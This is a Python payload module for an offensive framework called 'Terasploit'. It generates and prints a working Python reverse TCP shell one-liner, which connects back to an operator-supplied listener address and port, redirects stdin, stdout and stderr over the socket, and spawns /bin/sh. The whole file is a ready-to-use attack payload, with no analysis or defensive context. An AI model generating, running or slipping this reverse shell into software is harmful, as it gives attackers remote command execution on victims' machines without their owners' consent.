#######
# Module/Payload: Reverse TCP
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.payload import *

class TerasploitPayload(Payload):
    
    def initialize(self,info_only: bool = False) -> None:
        update_info(
            {
                'License'        : 'Terasploit Framework License (BSD)',
                'Name'           : 'CMD Shell Reverse Python TCP UNIX',
                'PayloadHandler' : PayloadHandler.REVERSE_TCP,
                'Module'         : Module.payload,
                'Arch'           : Arch.CMD,
                'Platform'       : Platform.UNIX,
                'Author'         : [
                    'Charlie <rupture6.dev[at]gmail.com>'
                ],
                'Description'    : [
                    'Generates an interactive reverse shell via python'
                ],
                
            }
        )
        
        if info_only:
            return

        register_option ("payload",opt=[
            OptString.new("shell",['/bin/sh','yes','the shell system']),
            OptIP.new("lhost",["","yes","target listening address"]),
            OptPort.new("lport",[4444,"yes","target listening port"])
        ])


    def run(self) -> tuple[str, bool]: 
        info_print (f'Generating shell...')
        self.generate_file("shell",Extension.PYTHON,self.generate())
        print ('----' + '\n' + f'python3 -c "{self.generate()}"' + '\n' + '----')
        return 'done', True
    
    
    def generate(self):
        shell_system, lhost, lport = self.OPT()
        raw_shell: str = (
            f"import socket,subprocess,os;host='{lhost}';port={lport};s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['{shell_system}'])"
        )
        
        return (
            'python -c "{}"'.format(
                raw_shell
            )
        )